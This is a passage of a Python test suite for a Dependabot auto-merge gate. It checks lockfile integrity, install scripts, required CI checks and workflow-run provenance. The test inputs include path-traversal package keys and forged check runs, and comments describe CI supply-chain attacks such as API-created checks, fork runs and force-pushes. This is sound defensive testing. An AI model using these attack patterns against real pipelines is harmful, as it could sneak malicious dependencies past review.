        # A base entry with no version to compare with holds.
        for before in ({"resolved": "packages/local", "link": True}, {**lock_entry("1.3.0"), "version": "1.3"}, "1.3.0"):
            with self.subTest(before=before):
                snapshot = self.edit(lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("1.3.1")}))
                edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({"node_modules/left-pad": before}), side="base")
                self.assert_holds(snapshot, '"node_modules/left-pad" was at')

    def test_named_dependency_is_bound_to_its_lock_version(self) -> None:
        # Finding Medium 2, attack N7: nothing tied the metadata's version to the lockfile.
        self.assertEqual(
            [(dep["dependency-name"], dep["dependency-version"]) for dep in GATE.decide(green_npm())["dependencies"]],
            [("react", "19.3.1"), ("react-dom", "19.3.1")],
        )
        snapshot = green_npm()
        set_metadata_version(snapshot, "react", "19.9.9")
        self.assert_holds(snapshot, 'the dependency metadata gives "react" "19.9.9", but website/package-lock.json locks "19.3.1"')
        # The version the files move to, with the metadata still saying 19.3.1.
        snapshot = green_npm()
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({self.REACT: lock_entry("19.4.0", "react")}))
        self.assert_holds(snapshot, 'the dependency metadata gives "react" "19.3.1", but website/package-lock.json locks "19.4.0"')
        # Exactly the named version, not one that starts with it.
        snapshot = green_npm()
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({self.REACT: lock_entry("19.3.10", "react")}))
        self.assert_holds(snapshot, 'the dependency metadata gives "react" "19.3.1", but website/package-lock.json locks "19.3.10"')
        # A name the lockfile does not move: unchanged, absent, or only nested.
        snapshot = green_npm()
        add_metadata(snapshot, "clsx", "2.1.2", "version-update:semver-patch")
        self.assert_holds(snapshot, 'the dependency metadata names "clsx", but website/package-lock.json does not change the version of "node_modules/clsx"')
        snapshot = green_npm()
        base = json.loads(file_entry(snapshot, PACKAGE_LOCK)["base"])["packages"]
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({self.REACT: {**base[self.REACT], "dev": True}}))
        self.assert_holds(snapshot, 'the dependency metadata names "react", but website/package-lock.json does not change the version of "node_modules/react"')
        snapshot = green_npm()
        add_metadata(snapshot, "left-pad", "1.3.0", "version-update:semver-patch", kind="indirect")
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({"node_modules/react/node_modules/left-pad": lock_entry("1.3.0")}))
        self.assert_holds(snapshot, 'the dependency metadata names "left-pad", but website/package-lock.json does not change the version of "node_modules/left-pad"')
        # A lockfile-only update is bound the same way.
        snapshot = green_npm()
        snapshot["files"] = [entry for entry in snapshot["files"] if entry["filename"] == PACKAGE_LOCK]
        snapshot["pull_request"]["changed_files"] = 1
        set_metadata_version(snapshot, "react-dom", "19.3.2")
        self.assert_holds(snapshot, 'the dependency metadata gives "react-dom" "19.3.2", but website/package-lock.json locks "19.3.1"')

    def test_integrity_must_be_sha512(self) -> None:
        for integrity in (None, "", "sha1-" + "A" * 27 + "=", "sha512-" + "A" * 85 + "==", "sha512-" + "A" * 86 + "== sha1-x", 7):
            with self.subTest(integrity=integrity):
                snapshot = self.edit(lambda lock: lock["packages"][self.REACT].update(integrity=integrity))
                self.assert_holds(snapshot, 'website/package-lock.json: "node_modules/react" has no sha512 integrity')
        snapshot = self.edit(lambda lock: lock["packages"][self.REACT].pop("integrity"))
        self.assert_holds(snapshot, 'website/package-lock.json: "node_modules/react" has no sha512 integrity')

    def test_new_install_script_holds(self) -> None:
        for value in (True, "true", 1):
            with self.subTest(value=value):
                snapshot = self.edit(lambda lock: lock["packages"][self.REACT].update(hasInstallScript=value))
                self.assert_holds(snapshot, 'website/package-lock.json: "node_modules/react" gains an install script')
        # A package that enters the tree with one.
        snapshot = self.edit(lambda lock: lock["packages"].update({"node_modules/left-pad": lock_entry("1.3.0", hasInstallScript=True)}))
        self.assert_holds(snapshot, 'website/package-lock.json: "node_modules/left-pad" gains an install script')
        # One that had it on main keeps it across an update.
        snapshot = green_npm()
        for side in ("base", "head"):
            edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"][self.REACT].update(hasInstallScript=True), side=side)
        self.assert_merges(snapshot)
        self.assert_merges(self.edit(lambda lock: lock["packages"][self.REACT].update(hasInstallScript=False)))

    def test_new_registry_package_merges(self) -> None:
        snapshot = self.edit(lambda lock: lock["packages"].update({"node_modules/@scope/left-pad": lock_entry("1.3.0", "@scope/left-pad")}))
        self.assert_merges(snapshot)

    def test_only_installed_registry_packages_may_change(self) -> None:
        cases = {
            "packages/local": ({"version": "1.0.0"}, 'the entry "packages/local" is not an installed package under node_modules/'),
            "node_modules/linked": ({"resolved": "packages/local", "link": True}, '"node_modules/linked" resolves from "packages/local"'),
            "node_modules/bundled": ({"version": "1.0.0", "inBundle": True}, '"node_modules/bundled" resolves from null'),
            "node_modules/text": ("1.0.0", 'the entry "node_modules/text" is not an object'),
            # Keys that name no package: the tarball could not be bound to a name.
            "node_modules/": (lock_entry("1.3.0"), 'the entry "node_modules/" is not an installed package under node_modules/'),
            "node_modules/@scope": (lock_entry("1.3.0", "@scope"), 'the entry "node_modules/@scope" is not an installed package under node_modules/'),
            "node_modules/left-pad/lib": (lock_entry("1.3.0"), 'the entry "node_modules/left-pad/lib" is not an installed package under node_modules/'),
            "node_modules/../left-pad": (lock_entry("1.3.0"), "is not an installed package under node_modules/"),
            # Finding N2 of the PR #197 review: `.` and `..` are no package names.
            "node_modules/.": (lock_entry("1.3.0", "."), "is not an installed package under node_modules/"),
            "node_modules/..": (lock_entry("1.3.0", ".."), "is not an installed package under node_modules/"),
            "node_modules/@scope/..": (lock_entry("1.3.0", "@scope/.."), "is not an installed package under node_modules/"),
            "node_modules/@../left-pad": (lock_entry("1.3.0", "@../left-pad"), "is not an installed package under node_modules/"),
            "node_modules/left-pad/node_modules/..": (lock_entry("1.3.0", ".."), "is not an installed package under node_modules/"),
            "node_modules/left pad": (lock_entry("1.3.0", "left pad"), "is not an installed package under node_modules/"),
            "x/node_modules/left-pad": (lock_entry("1.3.0"), "is not an installed package under node_modules/"),
        }
        for key, (entry, reason) in cases.items():
            with self.subTest(key=key):
                snapshot = self.edit(lambda lock: lock["packages"].update({key: entry}))
                self.assert_holds(snapshot, reason, only=False)

    def test_entries_already_on_main_are_not_read(self) -> None:
        # The rule judges what the pull request changes; main is not its business.
        snapshot = green_npm()
        old = {"version": "1.0.0", "resolved": "git+ssh://example.com/old.git", "hasInstallScript": True}
        for side in ("base", "head"):
            edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].update({"node_modules/old": old}), side=side)
        self.assert_merges(snapshot)
        # Removing a package is always allowed.
        edit_json(snapshot, PACKAGE_LOCK, lambda lock: lock["packages"].pop("node_modules/old"))
        self.assert_merges(snapshot)

    def test_fields_outside_packages_must_stay(self) -> None:
        for change in (lambda lock: lock.update(lockfileVersion=2), lambda lock: lock.update(name="evil"), lambda lock: lock.update(dependencies={})):
            snapshot = self.edit(change)
            self.assert_holds(snapshot, "website/package-lock.json changes a field outside `packages`")

    def test_root_entry_may_change_its_dependency_ranges_only(self) -> None:
        snapshot = self.edit(lambda lock: lock["packages"][""].update(workspaces=["packages/*"]))
        self.assert_holds(snapshot, "website/package-lock.json: the root entry changes something other than its dependency ranges")
        snapshot = self.edit(lambda lock: lock["packages"][""].update(dependencies=["react"]))
        self.assert_holds(snapshot, "website/package-lock.json is not a file this gate can read")

    def test_unreadable_lockfile_holds(self) -> None:
        for text, reason in (
            ("{", "is not a file this gate can read"),
            ('{"packages": {}, "packages": {}}', "is not a file this gate can read"),
            ('{"lockfileVersion": 1, "dependencies": {}}', "has no `packages` map"),
            ('{"lockfileVersion": 3, "packages": []}', "has no `packages` map"),
        ):
            for side in ("base", "head"):
                with self.subTest(text=text, side=side):
                    snapshot = green_npm()
                    file_entry(snapshot, PACKAGE_LOCK)[side] = text
                    self.assert_holds(snapshot, f"website/package-lock.json {reason}")


class CheckRuleTests(GateTestCase):
    def test_failed_check_holds(self) -> None:
        # Not a required check: every check on the head commit counts.
        snapshot = green_gomod()
        self.assertNotIn("Socket Security: Project Report", [check.name for check in GATE.REQUIRED_GOMOD])
        run_named(snapshot, "Socket Security: Project Report")["conclusion"] = "failure"
        self.assert_holds(snapshot, 'check "Socket Security: Project Report" ("socket-security") concluded "failure"')

    def test_pending_check_holds(self) -> None:
        for status in ("queued", "in_progress", "waiting", "requested", "pending", None):
            with self.subTest(status=status):
                snapshot = green_gomod()
                run_named(snapshot, "Test (windows)").update(status=status, conclusion=None)
                self.assert_holds(snapshot, 'check "Test (windows)" ("github-actions") is not completed')

    def test_cancelled_check_holds(self) -> None:
        for conclusion in ("cancelled", "timed_out", "action_required", "stale", "startup_failure", "something-new", None):
            with self.subTest(conclusion=conclusion):
                snapshot = green_gomod()
                run_named(snapshot, "Build (linux/amd64)")["conclusion"] = conclusion
                self.assert_holds(snapshot, 'check "Build (linux/amd64)" ("github-actions") concluded')

    def test_skipped_and_neutral_checks_pass_unless_required(self) -> None:
        for conclusion in ("skipped", "neutral"):
            with self.subTest(conclusion=conclusion):
                snapshot = green_gomod()
                run_named(snapshot, "Socket Security: Project Report")["conclusion"] = conclusion
                self.assert_merges(snapshot)
                run_named(snapshot, "License Headers")["conclusion"] = conclusion
                self.assert_holds(snapshot, f'required check "License Headers" concluded {conclusion}; it must succeed')

    def test_missing_required_check_holds(self) -> None:
        for eco, green in (("gomod", green_gomod), ("npm", green_npm)):
            for required in {"gomod": GATE.REQUIRED_GOMOD, "npm": GATE.REQUIRED_NPM}[eco]:
                with self.subTest(ecosystem=eco, check=required.name):
                    snapshot = green()
                    for listing in [snapshot["check_runs"]] + [run.get("check_runs", []) for run in snapshot["workflow_runs"]]:
                        listing[:] = [run for run in listing if (run["name"], run["app"]["slug"]) != (required.name, required.app)]
                    if required.app == GATE.ACTIONS_APP:
                        # Looked up in Dependabot's own run of its workflow file.
                        path = GATE.WORKFLOW_FILES[required.workflow]
                        verdict = self.assert_holds(snapshot, f"of {path} (attempt 1): it has not run")
                        self.assertTrue(verdict["reasons"][0].startswith(f'required check "{required.name}" ({required.workflow}) in Dependabot\'s run '))
                    else:
                        self.assert_holds(snapshot, f'required check "{required.name}" ({required.workflow}) has not run on the head commit')

    def test_required_check_from_another_app_does_not_count(self) -> None:
        snapshot = green_gomod()
        run_named(snapshot, "Test (windows)")["app"]["slug"] = "some-other-app"
        self.assert_holds(snapshot, 'required check "Test (windows)" (CI): the check runs of the head commit list none under its name')
        snapshot = green_gomod()
        suite_check(snapshot, "Test (windows)")["app"]["slug"] = "some-other-app"
        self.assert_holds(snapshot, 'required check "Test (windows)" (CI) in Dependabot\'s run 45145297237 of .github/workflows/ci.yml (attempt 1): it has not run')

    def test_no_checks_at_all_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["check_runs"] = []
        verdict = self.assert_holds(snapshot, "has not run on the head commit", "the check runs of the head commit list none under its name", only=False)
        self.assertEqual(len(verdict["reasons"]), len(GATE.REQUIRED_GOMOD))
        for key in ("check_runs", "statuses"):
            with self.subTest(key=key):
                snapshot = green_gomod()
                snapshot[key] = None
                self.assert_holds(snapshot, "could not be read", only=False)

    def test_duplicate_run_must_pass_too(self) -> None:
        # Attack A8: a second run of a required check, failed or skipped.
        snapshot = green_gomod()
        failed = copy.deepcopy(run_named(snapshot, "Test (macos)"))
        failed["conclusion"] = "failure"
        snapshot["check_runs"].append(failed)
        self.assert_holds(snapshot, 'check "Test (macos)" ("github-actions") concluded "failure"')
        for conclusion in ("skipped", "neutral"):
            for position in (0, None):
                with self.subTest(conclusion=conclusion, position=position):
                    snapshot = green_gomod()
                    extra = copy.deepcopy(run_named(snapshot, "Test (windows)"))
                    extra["conclusion"] = conclusion
                    snapshot["check_runs"].insert(len(snapshot["check_runs"]) if position is None else position, extra)
                    self.assert_holds(snapshot, f'required check "Test (windows)" concluded {conclusion}; it must succeed')

    def test_external_security_checks_are_required(self) -> None:
        # Finding H3, attacks A9 and A9b: the apps that had not reported yet.
        for green in (green_gomod, green_npm):
            with self.subTest(green=green.__name__):
                snapshot = green()
                snapshot["check_runs"] = [run for run in snapshot["check_runs"] if run["app"]["slug"] not in ("socket-security", "sonarqubecloud")]
                self.assert_holds(
                    snapshot,
                    'required check "Socket Security: Pull Request Alerts" (Socket Security) has not run on the head commit',
                    'required check "SonarCloud Code Analysis" (SonarCloud) has not run on the head commit',
                )
                snapshot = green()
                snapshot["check_runs"] = [
                    run for run in snapshot["check_runs"] if (run["name"], run["app"]["slug"]) != ("SonarCloud", "github-advanced-security")
                ]
                self.assert_holds(snapshot, 'required check "SonarCloud" (SonarCloud) has not run on the head commit')
                # The same name from the Actions app is not that check.
                snapshot = green()
                run_named(snapshot, "SonarCloud Code Analysis")["app"]["slug"] = "github-actions"
                self.assert_holds(snapshot, 'required check "SonarCloud Code Analysis" (SonarCloud) has not run on the head commit')

    def test_check_run_of_another_commit_holds(self) -> None:
        snapshot = green_gomod()
        run_named(snapshot, "Socket Security: Project Report")["head_sha"] = "0" * 40
        self.assert_holds(snapshot, "is not for the pull request head")

    def test_malformed_check_run_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["check_runs"].append({"name": "x", "status": "completed", "conclusion": "success"})
        self.assert_holds(snapshot, "a check run has no name or app", 'check "x" has no id', 'check "x" has no check suite id')

    def test_ignored_checks_are_not_read(self) -> None:
        for (name, app), reason in GATE.IGNORED_CHECKS.items():
            with self.subTest(check=name):
                self.assertGreater(len(reason), 40)
                snapshot = green_gomod()
                snapshot["check_runs"] = [run for run in snapshot["check_runs"] if run["name"] != name]
                run = {"id": 7, "name": name, "status": "completed", "conclusion": "failure", "app": {"slug": app}, "check_suite": {"id": 1}}
                snapshot["check_runs"].append({**run, "head_sha": snapshot["head_sha"]})
                self.assert_merges(snapshot)
                snapshot["check_runs"][-1]["status"] = "in_progress"
                self.assert_merges(snapshot)
                snapshot["check_runs"][-1]["app"] = {"slug": "some-other-app"}
                self.assert_holds(snapshot, f'check "{name}" ("some-other-app") is not completed')

    def test_only_documented_checks_are_ignored(self) -> None:
        self.assertEqual(
            sorted(GATE.IGNORED_CHECKS), [("Dependabot merge gate", "github-actions"), ("Track Benchmarks", "github-actions")]
        )
        for eco in GATE.ECOSYSTEMS:
            keys = [(required.name, required.app) for required in eco.required]
            self.assertEqual(len(keys), len(set(keys)), eco.name)
            self.assertFalse(set(keys) & set(GATE.IGNORED_CHECKS), eco.name)

    def test_commit_statuses_count(self) -> None:
        snapshot = green_gomod()
        snapshot["statuses"] = [{"context": "ci/external", "state": "success"}]
        self.assert_merges(snapshot)
        for state in ("failure", "error", "pending", None):
            with self.subTest(state=state):
                snapshot["statuses"] = [{"context": "ci/external", "state": state}]
                self.assert_holds(snapshot, 'commit status "ci/external" is')


class CheckProvenanceTests(GateTestCase):
    """Finding M2: who started the workflow run behind each required check, and which of its jobs reported it."""

    def test_real_runs_are_dependabot_pull_request_runs(self) -> None:
        for number in (189, 190, 191):
            for run in real(number)["workflow_runs"]:
                with self.subTest(pr=number, path=run["path"]):
                    self.assertEqual((run["actor"], run["event"], run["run_attempt"]), ({"id": 49699333}, "pull_request", 1))
                    self.assertEqual(run["head_repository"], {"id": REPO_ID})
                    self.assertEqual(run["repository"], {"id": REPO_ID})
        self.assertEqual({run["path"] for run in real(190)["workflow_runs"]} - set(GATE.WORKFLOW_FILES.values()), {".github/workflows/benchmarks.yml"})

    def test_run_started_by_someone_else_holds(self) -> None:
        # Someone with push access force-pushed a Dependabot-authored,
        # GitHub-signed commit: the commit rules pass, the runs are theirs.
        for workflow in ("CI", "Lint", "Formal Verification", "CodeQL"):
            with self.subTest(workflow=workflow):
                snapshot = green_gomod()
                workflow_run(snapshot, workflow)["actor"]["id"] = 1
                path = GATE.WORKFLOW_FILES[workflow]
                verdict = self.assert_holds(
                    snapshot,
                    f'a "pull_request" run of "{path}" for the head commit was started by user id 1, not by dependabot[bot] (49699333)',
                    f"dependabot[bot] started no pull_request run of {path} on this repository's branch for the head commit",
                    only=False,
                )
                bound_here = [check for check in GATE.REQUIRED_GOMOD if check.workflow == workflow and check.app == GATE.ACTIONS_APP]
                self.assertEqual(len(verdict["reasons"]), 1 + len(bound_here), verdict["reasons"])
        snapshot = green_npm()
        workflow_run(snapshot, "Test Website Build")["actor"]["id"] = 19864447
        self.assert_holds(snapshot, "was started by user id 19864447, not by dependabot[bot]", "dependabot[bot] started no pull_request run")

    def test_superseded_run_started_by_someone_else_holds(self) -> None:
        # Finding Low 2, attack N13: a person pushed this head (or reopened
        # the pull request) and Dependabot's runs came later. Every required
        # check points at a Dependabot run; the person's runs are still there.
        for workflow in ("CI", "Lint", "Formal Verification", "CodeQL", "Test Website Build"):
            with self.subTest(workflow=workflow):
                snapshot = green_npm() if workflow == "Test Website Build" else green_gomod()
                earlier = copy.deepcopy(workflow_run(snapshot, workflow))
                earlier.update(id=earlier["id"] - 1000, check_suite_id=earlier["check_suite_id"] - 1000, actor={"id": 12345})
                snapshot["workflow_runs"].append(earlier)
                path = GATE.WORKFLOW_FILES[workflow]
                self.assert_holds(snapshot, f'a "pull_request" run of "{path}" for the head commit was started by user id 12345, not by dependabot[bot] (49699333)')
        # Dependabot's own earlier run of the same workflow is no reason: the newest one is bound.
        snapshot = green_gomod()
        earlier = copy.deepcopy(workflow_run(snapshot, "CI"))
        earlier.update(id=earlier["id"] - 1000, check_suite_id=earlier["check_suite_id"] - 1000, conclusion="failure")
        snapshot["workflow_runs"].append(earlier)
        self.assert_merges(snapshot)

    def test_other_runs_by_a_person_are_no_reason(self) -> None:
        # Attack N14 and its neighbours: runs that no push or reopen by that
        # person explains. A maintainer may dispatch a required workflow on
        # the branch, and `benchmarks: run` is a label a maintainer adds
        # (benchmarks.yml runs on `labeled`, with the labeller as actor).
        snapshot = green_gomod()
        sha = snapshot["head_sha"]
        for number, (path, event) in enumerate(
            (
                (".github/workflows/evil.yml", "push"),
                (".github/workflows/ci.yml", "workflow_dispatch"),
                (".github/workflows/lint.yml", "schedule"),
                (".github/workflows/benchmarks.yml", "pull_request"),
            )
        ):
            snapshot["workflow_runs"].append(
                {
                    "id": 7 + number,
                    "path": path,
                    "event": event,
                    "head_sha": sha,
                    "check_suite_id": 70 + number,
                    "run_attempt": 1,
                    "conclusion": "failure",
                    "actor": {"id": 1},
                    "repository": {"id": REPO_ID},
                    "head_repository": {"id": REPO_ID},
                }
            )
        self.assert_merges(snapshot)
        self.assertNotIn(".github/workflows/benchmarks.yml", GATE.REQUIRED_WORKFLOW_PATHS)
        self.assertEqual(GATE.REQUIRED_WORKFLOW_PATHS, set(GATE.WORKFLOW_FILES.values()))

    # ---- finding S1 of the PR #197 review: runs of a fork's pull request

    def test_fork_run_with_the_head_commit_does_not_hold(self) -> None:
        # Probe P1: anyone may open a pull request from a fork with
        # Dependabot's head commit. Its runs are started by that person and
        # run on that commit; a maintainer may approve them. Before the fix
        # the actor hold fired on them and the real pull request held for good.
        for workflow in ("CI", "Lint", "Formal Verification", "CodeQL"):
            with self.subTest(workflow=workflow):
                snapshot = green_gomod()
                snapshot["workflow_runs"].append(fork_run(snapshot, workflow))
                self.assert_merges(snapshot)
        # The probe's own shape: an unapproved run, with no jobs or check runs yet.
        snapshot = green_gomod()
        pending = {key: value for key, value in fork_run(snapshot, "CI").items() if key not in ("jobs", "check_runs")}
        snapshot["workflow_runs"].append(dict(pending, conclusion="action_required"))
        self.assert_merges(snapshot)
        # A fork run of the npm workflow too.
        snapshot = green_npm()
        snapshot["workflow_runs"].append(fork_run(snapshot, "Test Website Build"))
        self.assert_merges(snapshot)

    def test_fork_checks_neither_satisfy_nor_hold(self) -> None:
        # An approved fork run reports checks with the same names on the
        # same commit, later than Dependabot's, so `filter=latest` lists the
        # fork's instead. A failed one is not a reason to hold ...
        snapshot = green_gomod()
        fork = fork_run(snapshot, "CI")
        snapshot["workflow_runs"].append(fork)
        replace_with_fork_checks(snapshot, fork, conclusion="failure")
        self.assert_merges(snapshot)
        # ... and a passing one does not stand in for a failed Dependabot job.
        snapshot = green_gomod()
        suite_check(snapshot, "Test (macos)")["conclusion"] = "failure"
        fork = fork_run(snapshot, "CI")
        snapshot["workflow_runs"].append(fork)
        replace_with_fork_checks(snapshot, fork, conclusion="success")
        self.assert_holds(
            snapshot,
            'required check "Test (macos)" (CI) in Dependabot\'s run 45145297237 of .github/workflows/ci.yml (attempt 1): '
            'its check run concluded "failure" (status "completed")',
        )
        # Nor does a fork's run of a required workflow when Dependabot has none.
        snapshot = green_gomod()
        fork = fork_run(snapshot, "Lint")
        snapshot["workflow_runs"].remove(workflow_run(snapshot, "Lint"))
        snapshot["workflow_runs"].append(fork)
        replace_with_fork_checks(snapshot, fork, conclusion="success")
        verdict = self.assert_holds(snapshot, "dependabot[bot] started no pull_request run of .github/workflows/lint.yml", only=False)
        self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "Lint"]))

    def test_run_of_a_deleted_fork_is_a_fork_run(self) -> None:
        # A run whose head repository is gone (`head_repository: null`) is
        # not on this repository's branch: a branch of this repository always
        # has it as the head repository. It is the run of a fork that was
        # deleted, and like any fork's run its checks neither hold ...
        snapshot = green_gomod()
        orphan = fork_run(snapshot, "CI", fork=None)
        snapshot["workflow_runs"].append(orphan)
        self.assertTrue(GATE._readable_run(orphan))
        self.assertFalse(GATE._own_run(orphan))
        self.assertEqual(GATE.fork_suites(snapshot), {orphan["check_suite_id"]})
        self.assert_merges(snapshot)
        replace_with_fork_checks(snapshot, orphan, conclusion="failure")
        self.assert_merges(snapshot)
        # ... nor stand in for a failed Dependabot job ...
        snapshot = green_gomod()
        suite_check(snapshot, "Test (macos)")["conclusion"] = "failure"
        orphan = fork_run(snapshot, "CI", fork=None)
        snapshot["workflow_runs"].append(orphan)
        replace_with_fork_checks(snapshot, orphan, conclusion="success")
        self.assert_holds(
            snapshot,
            'required check "Test (macos)" (CI) in Dependabot\'s run 45145297237 of .github/workflows/ci.yml (attempt 1): '
            'its check run concluded "failure" (status "completed")',
        )
        # ... nor count as Dependabot's run when Dependabot started it.
        snapshot = green_gomod()
        orphan = fork_run(snapshot, "Lint", actor=GATE.DEPENDABOT[1], fork=None)
        snapshot["workflow_runs"].remove(workflow_run(snapshot, "Lint"))
        snapshot["workflow_runs"].append(orphan)
        replace_with_fork_checks(snapshot, orphan, conclusion="success")
        self.assert_holds(snapshot, "dependabot[bot] started no pull_request run of .github/workflows/lint.yml", only=False)

    def test_fork_and_own_runs_are_told_by_repository_ids(self) -> None:
        snapshot = green_gomod()
        run = workflow_run(snapshot, "CI")
        self.assertTrue(GATE._readable_run(run) and GATE._own_run(run))
        self.assertEqual(GATE.fork_suites(snapshot), set())
        run["head_repository"]["id"] = 7
        self.assertFalse(GATE._own_run(run))
        self.assertEqual(GATE.fork_suites(snapshot), {run["check_suite_id"]})
        # Dependabot's runs on a fork's branch are not Dependabot's pull request runs.
        verdict = self.assert_holds(snapshot, "dependabot[bot] started no pull_request run of .github/workflows/ci.yml", only=False)
        self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "CI"]))

    def test_run_of_another_event_holds(self) -> None:
        for event in ("push", "pull_request_target", "workflow_dispatch", "schedule"):
            with self.subTest(event=event):
                snapshot = green_gomod()
                workflow_run(snapshot, "CI")["event"] = event
                verdict = self.assert_holds(snapshot, "dependabot[bot] started no pull_request run of .github/workflows/ci.yml", only=False)
                self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "CI"]))
        # A person's run of another event is not read: only Dependabot's pull_request run is bound.
        snapshot = green_gomod()
        workflow_run(snapshot, "CI").update(event="workflow_dispatch", actor={"id": 1})
        self.assert_holds(snapshot, "dependabot[bot] started no pull_request run of .github/workflows/ci.yml", only=False)

    def test_check_must_come_from_its_workflow_file(self) -> None:
        # A check named like a required one in a run of another workflow:
        # it is not the job of the run the name is bound to.
        snapshot = green_gomod()
        # Attack N15 of the first review: the listing files the bound check run in another run's suite.
        ci_suite = workflow_run(snapshot, "CI")["check_suite_id"]
        bound = run_named(snapshot, "goplint consumer gates")["id"]
        run_named(snapshot, "goplint consumer gates")["check_suite"]["id"] = ci_suite
        self.assert_holds(
            snapshot,
            f'required check "goplint consumer gates" (Lint): the check runs of the head commit list {bound} (suite {ci_suite}) under its name, '
            f"not only the job {bound} of Dependabot's run (suite {workflow_run(snapshot, 'Lint')['check_suite_id']})",
        )
        snapshot = green_gomod()
        moved = suite_check(snapshot, "goplint consumer gates")
        workflow_run(snapshot, "Lint")["check_runs"].remove(moved)
        workflow_run(snapshot, "CI")["check_runs"].append(dict(moved, check_suite={"id": workflow_run(snapshot, "CI")["check_suite_id"]}))
        self.assert_holds(
            snapshot,
            'required check "goplint consumer gates" (Lint) in Dependabot\'s run 45145297215 of .github/workflows/lint.yml (attempt 1): it has not run',
        )
        snapshot = green_gomod()
        workflow_run(snapshot, "Lint")["path"] = ".github/workflows/lint.yml@refs/heads/evil"
        verdict = self.assert_holds(snapshot, "dependabot[bot] started no pull_request run of .github/workflows/lint.yml", only=False)
        self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "Lint"]))

    def test_second_check_of_a_required_name_holds(self) -> None:
        # The listing of the head commit must show the bound job under each
        # required name, and nothing else outside a fork's runs.
        name = "License Headers"
        reason = f'required check "{name}" (CI): the check runs of the head commit list '
        snapshot = green_gomod()
        bound = run_named(snapshot, name)["id"]
        run_named(snapshot, name)["id"] += 1
        suite = run_named(snapshot, name)["check_suite"]["id"]
        self.assert_holds(snapshot, reason + f"{bound + 1} (suite {suite}) under its name, not only the job {bound} of Dependabot's run (suite {suite})")
        snapshot = green_gomod()
        snapshot["check_runs"].append(dict(run_named(snapshot, name), id=bound + 1, check_suite={"id": 1}))
        self.assert_holds(snapshot, reason + f"{bound} (suite {suite}), {bound + 1} (suite 1) under its name")
        snapshot = green_gomod()
        snapshot["check_runs"].remove(run_named(snapshot, name))
        self.assert_holds(snapshot, reason + f"none under its name, not only the job {bound}")
        for check_id in (None, str(bound), True):
            with self.subTest(check_id=check_id):
                snapshot = green_gomod()
                run_named(snapshot, name)["id"] = check_id
                self.assert_holds(snapshot, f'check "{name}" has no id', reason)
        # Another app's check of that name is not one of them.
        snapshot = green_gomod()
        snapshot["check_runs"].append(dict(run_named(snapshot, name), id=bound + 1, app={"slug": "some-other-app"}))
        self.assert_merges(snapshot)

    def test_check_created_through_the_api_is_not_a_required_check(self) -> None:
        # The attack of finding Medium 1 with #190's own data: a job that
        # may write checks creates one named like a required Lint check,
        # which GitHub files in the lint.yml suite (as it did with
        # `JUnit Report (macos)`), and `filter=latest` then lists it in
        # place of the real job's check.
        snapshot = green_gomod()
        ghost = suite_check(snapshot, "JUnit Report (macos)")
        self.assertEqual(ghost["check_suite"]["id"], workflow_run(snapshot, "Lint")["check_suite_id"])
        ghost["name"] = "goplint consumer gates"
        self.assert_holds(
            snapshot,
            'required check "goplint consumer gates" (Lint) in Dependabot\'s run 45145297215 of .github/workflows/lint.yml (attempt 1): '
            "a check of that name has no runner or no steps, as a check created through the API",
        )
        # The listing too, when the forged check replaces the real one there.
        run_named(snapshot, "goplint consumer gates")["id"] = ghost["id"]
        self.assert_holds(snapshot, "a check of that name has no runner or no steps", only=False)

    def test_required_check_must_be_a_job_of_its_run(self) -> None:
        name = "License Headers"
        reason = f'required check "{name}" (CI) in Dependabot\'s run 45145297237 of .github/workflows/ci.yml (attempt 1): '
        # A check id that no job of the run has.
        snapshot = green_gomod()
        suite_check(snapshot, name)["id"] += 1
        self.assert_holds(snapshot, reason + "0 of its jobs have the id of a check of that name", only=False)
        for check_id in (None, "137592989112", True):
            with self.subTest(check_id=check_id):
                snapshot = green_gomod()
                suite_check(snapshot, name)["id"] = check_id
                self.assert_holds(snapshot, reason + "0 of its jobs have the id of a check of that name", only=False)
        # A job of another run of the head is not a job of this one.
        snapshot = green_gomod()
        suite_check(snapshot, name)["id"] = suite_check(snapshot, "agent docs integrity")["id"]
        self.assert_holds(snapshot, reason + "0 of its jobs have the id of a check of that name", only=False)
        for field, value in (
            ("runner_id", None),
            ("runner_id", 0),
            ("runner_id", -1),
            ("runner_id", "1000022139"),
            ("runner_id", True),
            ("steps", []),
            ("steps", None),
            ("steps", 3),
        ):
            with self.subTest(field=field, value=value):
                snapshot = green_gomod()
                job_for(snapshot, name)[field] = value
                self.assert_holds(snapshot, reason + "a check of that name has no runner or no steps")
        snapshot = green_gomod()
        job_for(snapshot, name)["id"] = str(job_for(snapshot, name)["id"])
        self.assert_holds(snapshot, reason + "0 of its jobs have the id of a check of that name", only=False)
        snapshot = green_gomod()
        workflow_run(snapshot, "CI")["jobs"].append(copy.deepcopy(job_for(snapshot, name)))
        self.assert_holds(snapshot, reason + "2 of its jobs have the id of a check of that name")
        # Two jobs of the latest attempt with that name.
        snapshot = green_gomod()
        run = workflow_run(snapshot, "CI")
        twin = dict(copy.deepcopy(job_for(snapshot, name)), id=1)
        run["jobs"].append(twin)
        run["check_runs"].append(dict(suite_check(snapshot, name), id=1))
        self.assert_holds(snapshot, reason + "2 jobs of the latest attempt report it")
        # A check run of the suite listing that is of another suite.
        snapshot = green_gomod()
        suite_check(snapshot, name)["check_suite"]["id"] = 1
        verdict = self.assert_holds(snapshot, "a check run listed for the run's check suite is of another suite", only=False)
        self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "CI"]))

    # ---- finding B1 of the PR #197 review: the job, its steps and the run must have passed

    def test_job_step_and_run_conclusions_must_be_success(self) -> None:
        # Probe P2: a job that may write checks can PATCH the conclusion of
